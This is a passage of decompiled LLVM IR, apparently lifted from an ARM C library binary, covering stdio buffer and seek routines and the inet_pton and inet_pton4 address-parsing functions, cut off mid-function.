  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b980 = load i32, i32* @r4, align 4
  store i32 %v3_1b980, i32* %stack_var_-8, align 4
  %v1_1b984 = add i32 %arg1, 8
  %v1_1b988 = inttoptr i32 %v1_1b984 to i32*
  %v2_1b988 = load i32, i32* %v1_1b988, align 4
  %v3_1b988 = add i32 %arg1, 12
  %v4_1b988 = inttoptr i32 %v3_1b988 to i32*
  %v5_1b988 = load i32, i32* %v4_1b988, align 4
  %v2_1b98c = sub i32 %v5_1b988, %v2_1b988
  store i32 %v2_1b98c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1b994 = inttoptr i32 %arg1 to i16*
  %v4_1b994 = call i32 @__stdio_READ(i16* %v3_1b994, i32 %v2_1b988, i32 %v2_1b98c)
  %v0_1b998 = load i32, i32* @r4, align 4
  %v1_1b998 = add i32 %v0_1b998, 8
  %v2_1b998 = inttoptr i32 %v1_1b998 to i32*
  %v3_1b998 = load i32, i32* %v2_1b998, align 4
  store i32 %v3_1b998, i32* %r2.global-to-local, align 4
  %v2_1b99c = add i32 %v3_1b998, %v4_1b994
  %v2_1b9a0 = add i32 %v0_1b998, 20
  %v3_1b9a0 = inttoptr i32 %v2_1b9a0 to i32*
  store i32 %v2_1b99c, i32* %v3_1b9a0, align 4
  %v0_1b9a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b9a4 = load i32, i32* @r4, align 4
  %v2_1b9a4 = add i32 %v1_1b9a4, 16
  %v3_1b9a4 = inttoptr i32 %v2_1b9a4 to i32*
  store i32 %v0_1b9a4, i32* %v3_1b9a4, align 4
  %v2_1b9a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1b9a8, i32* @r4, align 4
  ret i32 %v4_1b994

; uselistorder directives
  uselistorder i32 %v4_1b994, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b9b0 = load i32, i32* @r4, align 4
  store i32 %v3_1b9b0, i32* %stack_var_-12, align 4
  %v0_1b9b4 = load i32, i32* @r0, align 4
  %v1_1b9b4 = inttoptr i32 %v0_1b9b4 to i16*
  %v2_1b9b4 = load i16, i16* %v1_1b9b4, align 2
  %v3_1b9b4 = zext i16 %v2_1b9b4 to i32
  store i32 %v3_1b9b4, i32* %r3.global-to-local, align 4
  %v0_1b9b8 = load i32, i32* @r1, align 4
  %v2_1b9b8 = and i32 %v0_1b9b8, %v3_1b9b4
  %v4_1b9b8 = icmp eq i32 %v2_1b9b8, 0
  store i32 %v0_1b9b4, i32* @r4, align 4
  br i1 %v4_1b9b8, label %dec_label_pc_1b9c8, label %dec_label_pc_1b9d8

dec_label_pc_1b9c8:                               ; preds = %entry
  %v1_1b9c8 = and i32 %v3_1b9b4, 2176
  %v2_1b9c8 = icmp eq i32 %v1_1b9c8, 0
  br i1 %v2_1b9c8, label %dec_label_pc_1b9d0, label %dec_label_pc_1b9e4

dec_label_pc_1b9d0:                               ; preds = %dec_label_pc_1b9c8
  %v2_1b9d0 = or i32 %v0_1b9b8, %v3_1b9b4
  store i32 %v2_1b9d0, i32* %r3.global-to-local, align 4
  %v1_1b9d4 = trunc i32 %v2_1b9d0 to i16
  store i16 %v1_1b9d4, i16* %v1_1b9b4, align 2
  %v0_1b9d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b9d8

dec_label_pc_1b9d8:                               ; preds = %entry, %dec_label_pc_1b9d0
  %v0_1b9d8 = phi i32 [ %v0_1b9b4, %entry ], [ %v0_1b9d8.pre, %dec_label_pc_1b9d0 ]
  %v1_1b9d8 = inttoptr i32 %v0_1b9d8 to i16*
  %v2_1b9d8 = load i16, i16* %v1_1b9d8, align 2
  %v3_1b9d8 = zext i16 %v2_1b9d8 to i32
  store i32 %v3_1b9d8, i32* %r3.global-to-local, align 4
  %v1_1b9dc = and i32 %v3_1b9d8, 16
  store i32 %v1_1b9dc, i32* %r5.global-to-local, align 4
  %v2_1b9dc = icmp eq i32 %v1_1b9dc, 0
  br i1 %v2_1b9dc, label %dec_label_pc_1ba04, label %dec_label_pc_1b9e4

dec_label_pc_1b9e4:                               ; preds = %dec_label_pc_1b9c8, %dec_label_pc_1b9d8
  %v0_1b9e4 = call i32 @__GI___errno_location()
  store i32 %v0_1b9e4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1b9ec = inttoptr i32 %v0_1b9e4 to i32*
  store i32 9, i32* %v2_1b9ec, align 4
  br label %dec_label_pc_1b9f0

dec_label_pc_1b9f0:                               ; preds = %dec_label_pc_1ba0c, %dec_label_pc_1b9e4
  %v0_1b9f0 = load i32, i32* @r4, align 4
  %v1_1b9f0 = inttoptr i32 %v0_1b9f0 to i16*
  %v2_1b9f0 = load i16, i16* %v1_1b9f0, align 2
  %v3_1b9f0 = zext i16 %v2_1b9f0 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1b9f8 = or i32 %v3_1b9f0, 8
  store i32 %v1_1b9f8, i32* %r3.global-to-local, align 4
  %v1_1b9fc = trunc i32 %v1_1b9f8 to i16
  store i16 %v1_1b9fc, i16* %v1_1b9f0, align 2
  %v1_1ba44.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ba3c

dec_label_pc_1ba04:                               ; preds = %dec_label_pc_1b9d8
  %v1_1ba04 = and i32 %v3_1b9d8, 64
  %v2_1ba04 = icmp eq i32 %v1_1ba04, 0
  br i1 %v2_1ba04, label %dec_label_pc_1ba2c, label %dec_label_pc_1ba0c

dec_label_pc_1ba0c:                               ; preds = %dec_label_pc_1ba04
  %v0_1ba0c = call i32 @__stdio_wcommit()
  store i32 %v0_1ba0c, i32* %r0.global-to-local, align 4
  %v2_1ba10 = icmp eq i32 %v0_1ba0c, 0
  br i1 %v2_1ba10, label %dec_label_pc_1ba18, label %dec_label_pc_1b9f0

dec_label_pc_1ba18:                               ; preds = %dec_label_pc_1ba0c
  %v0_1ba18 = load i32, i32* @r4, align 4
  %v1_1ba18 = inttoptr i32 %v0_1ba18 to i16*
  %v2_1ba18 = load i16, i16* %v1_1ba18, align 2
  %v3_1ba18 = zext i16 %v2_1ba18 to i32
  store i32 %v3_1ba18, i32* %r3.global-to-local, align 4
  %v1_1ba1c = add i32 %v0_1ba18, 8
  %v2_1ba1c = inttoptr i32 %v1_1ba1c to i32*
  %v3_1ba1c = load i32, i32* %v2_1ba1c, align 4
  %v1_1ba20 = and i32 %v3_1ba18, 65471
  store i32 %v1_1ba20, i32* %r3.global-to-local, align 4
  %v2_1ba24 = add i32 %v0_1ba18, 28
  %v3_1ba24 = inttoptr i32 %v2_1ba24 to i32*
  store i32 %v3_1ba1c, i32* %v3_1ba24, align 4
  %v0_1ba28 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ba28 = trunc i32 %v0_1ba28 to i16
  %v2_1ba28 = load i32, i32* @r4, align 4
  %v3_1ba28 = inttoptr i32 %v2_1ba28 to i16*
  store i16 %v1_1ba28, i16* %v3_1ba28, align 2
  %v0_1ba2c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ba2c

dec_label_pc_1ba2c:                               ; preds = %dec_label_pc_1ba04, %dec_label_pc_1ba18
  %v2_1ba34 = phi i32 [ %v0_1b9d8, %dec_label_pc_1ba04 ], [ %v0_1ba2c.pre, %dec_label_pc_1ba18 ]
  %v1_1ba2c = inttoptr i32 %v2_1ba34 to i16*
  %v2_1ba2c = load i16, i16* %v1_1ba2c, align 2
  %v3_1ba2c = zext i16 %v2_1ba2c to i32
  %v1_1ba30 = or i32 %v3_1ba2c, 1
  store i32 %v1_1ba30, i32* %r3.global-to-local, align 4
  %v1_1ba34 = trunc i32 %v1_1ba30 to i16
  store i16 %v1_1ba34, i16* %v1_1ba2c, align 2
  %v0_1ba38 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1ba38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ba3c

dec_label_pc_1ba3c:                               ; preds = %dec_label_pc_1b9f0, %dec_label_pc_1ba2c
  %v1_1ba44 = phi i32 [ %v1_1ba44.pre, %dec_label_pc_1b9f0 ], [ %v0_1ba38, %dec_label_pc_1ba2c ]
  %v2_1ba40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ba40, i32* @r4, align 4
  ret i32 %v1_1ba44

; uselistorder directives
  uselistorder i32 %v3_1b9b4, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1ba3c, { 1, 0 }
  uselistorder label %dec_label_pc_1ba2c, { 1, 0 }
  uselistorder label %dec_label_pc_1b9e4, { 1, 0 }
  uselistorder label %dec_label_pc_1b9d8, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1ba54 = load i32, i32* %arg2, align 4
  %v3_1ba54 = add i32 %tmp, 4
  %v4_1ba54 = inttoptr i32 %v3_1ba54 to i32*
  %v5_1ba54 = load i32, i32* %v4_1ba54, align 4
  %v1_1ba58 = add i32 %arg1, 4
  %v2_1ba58 = inttoptr i32 %v1_1ba58 to i32*
  %v3_1ba58 = load i32, i32* %v2_1ba58, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1ba60 = call i32 @__GI_lseek64(i32 %v3_1ba58, i32 %tmp, i32 %v2_1ba54, i32 %v5_1ba54)
  %v1_1ba64 = icmp slt i32* %arg2, null
  br i1 %v1_1ba64, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1ba6c5 = load i32, i32* @r4, align 4
  %v4_1ba6c6 = inttoptr i32 %v3_1ba6c5 to i32*
  store i32 %v4_1ba60, i32* %v4_1ba6c6, align 4
  %v6_1ba6c7 = add i32 %v3_1ba6c5, 4
  %v7_1ba6c8 = inttoptr i32 %v6_1ba6c7 to i32*
  store i32 %tmp, i32* %v7_1ba6c8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1ba60, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 0, 3, 4, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 16, 19, 20, 21, 22, 28, 29, 26, 27, 25, 24, 23, 30, 31, 32, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1ba84 = load i32, i32* @r4, align 4
  %v6_1ba84 = load i32, i32* @r5, align 4
  %v15_1ba84 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1ba9c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1ba9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1bb141 = load i32, i32* @r0, align 4
  %v1_1bb142 = inttoptr i32 %v0_1bb141 to i8*
  %v2_1bb143 = load i8, i8* %v1_1bb142, align 1
  %v3_1bb144 = zext i8 %v2_1bb143 to i32
  store i32 %v3_1bb144, i32* @r3, align 4
  %v2_1bb185 = icmp eq i8 %v2_1bb143, 0
  store i1 %v2_1bb185, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bb185, label %dec_label_pc_1bb24, label %dec_label_pc_1bab4

dec_label_pc_1bab4:                               ; preds = %entry, %dec_label_pc_1bb14.backedge
  %v0_1bab8 = phi i32 [ %v0_1bb14, %dec_label_pc_1bb14.backedge ], [ %v0_1bb141, %entry ]
  %v0_1baf0 = phi i32 [ %v3_1bb14, %dec_label_pc_1bb14.backedge ], [ %v3_1bb144, %entry ]
  %v2_1bac4.in = phi i32 [ %v3_1bb14, %dec_label_pc_1bb14.backedge ], [ %v3_1bb144, %entry ]
  %v2_1bac4 = add nsw i32 %v2_1bac4.in, -48
  %v2_1bab4 = icmp ugt i32 %v2_1bac4, 8
  %v7_1bab4 = icmp eq i32 %v2_1bac4, 9
  store i1 %v7_1bab4, i1* %cpsr_z.global-to-local, align 1
  %v1_1bab8 = add i32 %v0_1bab8, 1
  store i32 %v1_1bab8, i32* %r0.global-to-local, align 4
  %v2_1babc = xor i1 %v7_1bab4, true
  %v3_1babc = and i1 %v2_1bab4, %v2_1babc
  br i1 %v3_1babc, label %dec_label_pc_1baf0, label %dec_label_pc_1bac0

dec_label_pc_1bac0:                               ; preds = %dec_label_pc_1bab4
  %v0_1bac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bac0 = inttoptr i32 %v0_1bac0 to i8*
  %v2_1bac0 = load i8, i8* %v1_1bac0, align 1
  %v3_1bac0 = zext i8 %v2_1bac0 to i32
  %v0_1bac4 = load i32, i32* %r7.global-to-local, align 4
  %v3_1bac4 = mul i32 %v0_1bac4, %v3_1bac0
  %v4_1bac4 = add i32 %v3_1bac4, %v2_1bac4
  store i32 %v4_1bac4, i32* @r3, align 4
  %v2_1bac8 = icmp ugt i32 %v4_1bac4, 254
  %v7_1bac8 = icmp eq i32 %v4_1bac4, 255
  store i1 %v7_1bac8, i1* %cpsr_z.global-to-local, align 1
  %v2_1bacc = xor i1 %v7_1bac8, true
  %v3_1bacc = and i1 %v2_1bac8, %v2_1bacc
  br i1 %v3_1bacc, label %dec_label_pc_1bb48, label %dec_label_pc_1bad0

dec_label_pc_1bad0:                               ; preds = %dec_label_pc_1bac0
  %v0_1bad0 = load i32, i32* @lr, align 4
  %v2_1bad0 = icmp eq i32 %v0_1bad0, 0
  store i1 %v2_1bad0, i1* %cpsr_z.global-to-local, align 1
  %v1_1bad4 = trunc i32 %v4_1bac4 to i8
  store i8 %v1_1bad4, i8* %v1_1bac0, align 1
  %v0_1bad8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bad8, label %dec_label_pc_1badc, label %dec_label_pc_1bb14.backedge

dec_label_pc_1badc:                               ; preds = %dec_label_pc_1bad0
  %v0_1badc = load i32, i32* @ip, align 4
  %v1_1badc = add i32 %v0_1badc, 1
  store i32 %v1_1badc, i32* @ip, align 4
  %v7_1bae0 = icmp eq i32 %v1_1badc, 4
  store i1 %v7_1bae0, i1* %cpsr_z.global-to-local, align 1
  %v0_1bae4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1bae4, i32* @lr, align 4
  %v8_1bae8 = icmp sgt i32 %v1_1badc, 4
  br i1 %v8_1bae8, label %dec_label_pc_1bb48, label %dec_label_pc_1bb14.backedge

dec_label_pc_1baf0:                               ; preds = %dec_label_pc_1bab4
  %v7_1baf0 = icmp eq i32 %v0_1baf0, 46
  %v1_1baf8 = load i32, i32* @lr, align 4
  %v2_1baf8 = urem i32 %v1_1baf8, 2
  %storemerge12 = select i1 %v7_1baf0, i32 %v2_1baf8, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1bafc = icmp eq i32 %storemerge12, 0
  store i1 %v2_1bafc, i1* %cpsr_z.global-to-local, align 1
  %v0_1bb00 = load i32, i32* @r5, align 4
  store i32 %v0_1bb00, i32* @lr, align 4
  br i1 %v2_1bafc, label %dec_label_pc_1bb48, label %dec_label_pc_1bb08

dec_label_pc_1bb08:                               ; preds = %dec_label_pc_1baf0
  %v0_1bb08 = load i32, i32* @ip, align 4
  %v7_1bb08 = icmp eq i32 %v0_1bb08, 4
  store i1 %v7_1bb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bb08, label %dec_label_pc_1bb48, label %dec_label_pc_1bb10

dec_label_pc_1bb10:                               ; preds = %dec_label_pc_1bb08
  %v1_1bb10 = trunc i32 %v0_1bb00 to i8
  %v2_1bb10 = load i32, i32* %r1.global-to-local, align 4
  %v3_1bb10 = add i32 %v2_1bb10, 1
  %v4_1bb10 = inttoptr i32 %v3_1bb10 to i8*
  store i8 %v1_1bb10, i8* %v4_1bb10, align 1
  %v5_1bb10 = load i32, i32* %r1.global-to-local, align 4
  %v6_1bb10 = add i32 %v5_1bb10, 1
  store i32 %v6_1bb10, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1bb14.backedge

dec_label_pc_1bb14.backedge:                      ; preds = %dec_label_pc_1bb10, %dec_label_pc_1bad0, %dec_label_pc_1badc
  %v0_1bb14 = load i32, i32* %r0.global-to-local, align 4
  %v1_1bb14 = inttoptr i32 %v0_1bb14 to i8*
  %v2_1bb14 = load i8, i8* %v1_1bb14, align 1
  %v3_1bb14 = zext i8 %v2_1bb14 to i32
  store i32 %v3_1bb14, i32* @r3, align 4
  %v2_1bb18 = icmp eq i8 %v2_1bb14, 0
  store i1 %v2_1bb18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bb18, label %dec_label_pc_1bb14.dec_label_pc_1bb24_crit_edge, label %dec_label_pc_1bab4

dec_label_pc_1bb14.dec_label_pc_1bb24_crit_edge:  ; preds = %dec_label_pc_1bb14.backedge
  %v0_1bb24.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1bb24

dec_label_pc_1bb24:                               ; preds = %dec_label_pc_1bb14.dec_label_pc_1bb24_crit_edge, %entry
  %v0_1bb24 = phi i32 [ %v0_1bb24.pre, %dec_label_pc_1bb14.dec_label_pc_1bb24_crit_edge ], [ 0, %entry ]
  %v7_1bb24 = icmp eq i32 %v0_1bb24, 3
  store i1 %v7_1bb24, i1* %cpsr_z.global-to-local, align 1
  %v7_1bb28 = icmp slt i32 %v0_1bb24, 4
  br i1 %v7_1bb28, label %dec_label_pc_1bb48, label %dec_label_pc_1bb2c

dec_label_pc_1bb2c:                               ; preds = %dec_label_pc_1bb24
  %v0_1bb2c = load i32, i32* @r4, align 4
  store i32 %v0_1bb2c, i32* @r0, align 4
  store i32 %v2_1ba9c, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1bb38 = call i32 @memcpy()
  br label %dec_label_pc_1bb48

dec_label_pc_1bb48:                               ; preds = %dec_label_pc_1bac0, %dec_label_pc_1badc, %dec_label_pc_1baf0, %dec_label_pc_1bb08, %dec_label_pc_1bb24, %dec_label_pc_1bb2c
  %storemerge = phi i32 [ 1, %dec_label_pc_1bb2c ], [ 0, %dec_label_pc_1bb24 ], [ 0, %dec_label_pc_1bb08 ], [ 0, %dec_label_pc_1baf0 ], [ 0, %dec_label_pc_1badc ], [ 0, %dec_label_pc_1bac0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1ba84, i32* @r4, align 4
  store i32 %v6_1ba84, i32* @r5, align 4
  store i32 %v15_1ba84, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1bb24, { 1, 0 }
  uselistorder i32 %v3_1bb14, { 2, 1, 0 }
  uselistorder i32 %v0_1bb14, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_1bac4, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1bb48, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1bb14.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1bab4, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1bb54 = load i32, i32* @r4, align 4
  %v6_1bb54 = load i32, i32* @r5, align 4
  %v9_1bb54 = load i32, i32* @r6, align 4
  %v12_1bb54 = load i32, i32* @r7, align 4
  %v27_1bb54 = load i32, i32* @lr, align 4
  %v7_1bb60 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1bb60, label %dec_label_pc_1bb80, label %dec_label_pc_1bb74

dec_label_pc_1bb74:                               ; preds = %entry
  %v7_1bb74 = icmp eq i32 %arg1, 10
  br i1 %v7_1bb74, label %dec_label_pc_1bb90, label %dec_label_pc_1bd48

dec_label_pc_1bb80:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1bb88 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1bd58

dec_label_pc_1bb90:                               ; preds = %dec_label_pc_1bb74
  %v2_1bb90 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1bb9c = bitcast i32* %stack_var_-56 to i8*
  %v3_1bb9c = call i32 @__GI_memset(i8* %v2_1bb9c, i32 0)
  %v0_1bba0 = load i32, i32* @r5, align 4
  %v1_1bba0 = inttoptr i32 %v0_1bba0 to i8*
  %v2_1bba0 = load i8, i8* %v1_1bba0, align 1
  %v3_1bba0 = zext i8 %v2_1bba0 to i32
  store i32 %v3_1bba0, i32* %r3.global-to-local, align 4
  %v7_1bba4 = icmp eq i8 %v2_1bba0, 58
  store i32 %v3_1bb9c, i32* @r6, align 4
  %v2_1bbac = add i32 %v3_1bb9c, 16
  store i32 %v2_1bbac, i32* %r8.global-to-local, align 4
  br i1 %v7_1bba4, label %dec_label_pc_1bbb4, label %dec_label_pc_1bbc0

dec_label_pc_1bbb4:                               ; preds = %dec_label_pc_1bb90
  %v1_1bbb4 = add i32 %v0_1bba0, 1
  %v2_1bbb4 = inttoptr i32 %v1_1bbb4 to i8*
  %v3_1bbb4 = load i8, i8* %v2_1bbb4, align 1
  %v4_1bbb4 = zext i8 %v3_1bbb4 to i32
  store i32 %v4_1bbb4, i32* %r3.global-to-local, align 4
  store i32 %v1_1bbb4, i32* @r5, align 4
  %v7_1bbb8 = icmp eq i8 %v3_1bbb4, 58
  br i1 %v7_1bbb8, label %dec_label_pc_1bbc0, label %dec_label_pc_1bd40

dec_label_pc_1bbc0:                               ; preds = %dec_label_pc_1bbb4, %dec_label_pc_1bb90
  %v0_1bbcc = phi i32 [ %v1_1bbb4, %dec_label_pc_1bbb4 ], [ %v0_1bba0, %dec_label_pc_1bb90 ]
  store i32 -34356, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_1bbc8 = load i32, i32* @r4, align 4
  %v2_1bbc8 = add i32 %v0_1bbc8, -34356
  store i32 %v0_1bbcc, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_1bbc8, i32* %stack_var_-64, align 4
  %v1_1bca43 = inttoptr i32 %v0_1bbcc to i8*
  %v2_1bca44 = load i8, i8* %v1_1bca43, align 1
  %v3_1bca45 = zext i8 %v2_1bca44 to i32
  store i32 %v3_1bca45, i32* @r4, align 4
  %v2_1bca86 = icmp eq i8 %v2_1bca44, 0
  br i1 %v2_1bca86, label %dec_label_pc_1bcb0.thread, label %dec_label_pc_1bbe0

dec_label_pc_1bcb0.thread:                        ; preds = %dec_label_pc_1bbc0
  store i32 %v3_1bb9c, i32* @r4, align 4
  br label %dec_label_pc_1bcdc

dec_label_pc_1bbe0:                               ; preds = %dec_label_pc_1bbc0, %dec_label_pc_1bca4.backedge.dec_label_pc_1bbe0_crit_edge
  %v0_1bbe4 = phi i32 [ %v3_1bca4, %dec_label_pc_1bca4.backedge.dec_label_pc_1bbe0_crit_edge ], [ %v3_1bca45, %dec_label_pc_1bbc0 ]
  %v2_1bbe0 = phi i32 [ %v2_1bbe0.pre, %dec_label_pc_1bca4.backedge.dec_label_pc_1bbe0_crit_edge ], [ %v2_1bbc8, %dec_label_pc_1bbc0 ]
  store i32 %v2_1bbe0, i32* @r0, align 4
  %v1_1bbe4 = or i32 %v0_1bbe4, 32
  store i32 %v1_1bbe4, i32* %r1.global-to-local, align 4
  %v2_1bbe8 = call i32 @__GI_strchr(i32 %v2_1bbe0, i32 %v1_1bbe4)
  %v2_1bbec = icmp eq i32 %v2_1bbe8, 0
  %v0_1bbf0 = load i32, i32* @r5, align 4
  %v1_1bbf0 = add i32 %v0_1bbf0, 1
  store i32 %v1_1bbf0, i32* @r5, align 4
  br i1 %v2_1bbec, label %dec_label_pc_1bc14, label %dec_label_pc_1bbf8

dec_label_pc_1bbf8:                               ; preds = %dec_label_pc_1bbe0
  %v2_1bbf8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1bbf8, i32* %r2.global-to-local, align 4
  %v2_1bbfc = sub i32 %v2_1bbe8, %v2_1bbf8
  %v1_1bc00 = load i32, i32* @r7, align 4
  %v4_1bc00 = mul i32 %v1_1bc00, 16
  %v5_1bc00 = or i32 %v4_1bc00, %v2_1bbfc
  store i32 %v5_1bc00, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_1bc00, 65536
  br i1 %tmp36, label %dec_label_pc_1bca0, label %dec_label_pc_1bd40

dec_label_pc_1bc14:                               ; preds = %dec_label_pc_1bbe0
  %v0_1bc14 = load i32, i32* @r4, align 4
  %v7_1bc14 = icmp eq i32 %v0_1bc14, 58
  br i1 %v7_1bc14, label %dec_label_pc_1bc1c, label %dec_label_pc_1bc74

dec_label_pc_1bc1c:                               ; preds = %dec_label_pc_1bc14
  %v0_1bc1c = load i32, i32* %sb.global-to-local, align 4
  %v2_1bc1c = icmp eq i32 %v0_1bc1c, 0
  br i1 %v2_1bc1c, label %dec_label_pc_1bc24, label %dec_label_pc_1bc38

dec_label_pc_1bc24:                               ; preds = %dec_label_pc_1bc1c
  %v0_1bc24 = load i32, i32* %fp.global-to-local, align 4
  %v2_1bc24 = icmp eq i32 %v0_1bc24, 0
  br i1 %v2_1bc24, label %dec_label_pc_1bc2c, label %dec_label_pc_1bd40

dec_label_pc_1bc2c:                               ; preds = %dec_label_pc_1bc24
  %v0_1bc2c = load i32, i32* @r6, align 4
  store i32 %v0_1bc2c, i32* %fp.global-to-local, align 4
  store i32 %v1_1bbf0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1bca4.backedge

dec_label_pc_1bc38:                               ; preds = %dec_label_pc_1bc1c
  %v1_1bc38 = inttoptr i32 %v1_1bbf0 to i8*
  %v2_1bc38 = load i8, i8* %v1_1bc38, align 1
  %v3_1bc38 = zext i8 %v2_1bc38 to i32
  store i32 %v3_1bc38, i32* %r3.global-to-local, align 4
  %v2_1bc3c = icmp eq i8 %v2_1bc38, 0
  br i1 %v2_1bc3c, label %dec_label_pc_1bd40, label %dec_label_pc_1bc44

dec_label_pc_1bc44:                               ; preds = %dec_label_pc_1bc38
  %v0_1bc44 = load i32, i32* @r6, align 4
  %v1_1bc44 = add i32 %v0_1bc44, 2
  store i32 %v1_1bc44, i32* %r3.global-to-local, align 4
  %v1_1bc48 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1bc44, %v1_1bc48
  br i1 %tmp37, label %dec_label_pc_1bd40, label %dec_label_pc_1bc50

dec_label_pc_1bc50:                               ; preds = %dec_label_pc_1bc44
  %v0_1bc50 = load i32, i32* @r7, align 4
  %v3_1bc50 = udiv i32 %v0_1bc50, 256
  store i32 %v3_1bc50, i32* %r2.global-to-local, align 4
  store i32 %v0_1bc44, i32* %r3.global-to-local, align 4
  %v1_1bc58 = trunc i32 %v3_1bc50 to i8
  %v3_1bc58 = inttoptr i32 %v0_1bc44 to i8*
  store i8 %v1_1bc58, i8* %v3_1bc58, align 1
  %v4_1bc58 = load i32, i32* %r3.global-to-local, align 4
  %v5_1bc58 = add i32 %v4_1bc58, 1
  store i32 %v5_1bc58, i32* @r3, align 4
  %v0_1bc5c = load i32, i32* @r7, align 4
  %v1_1bc5c = trunc i32 %v0_1bc5c to i8
  %v2_1bc5c = load i32, i32* @r6, align 4
  %v3_1bc5c = add i32 %v2_1bc5c, 1
  %v4_1bc5c = inttoptr i32 %v3_1bc5c to i8*
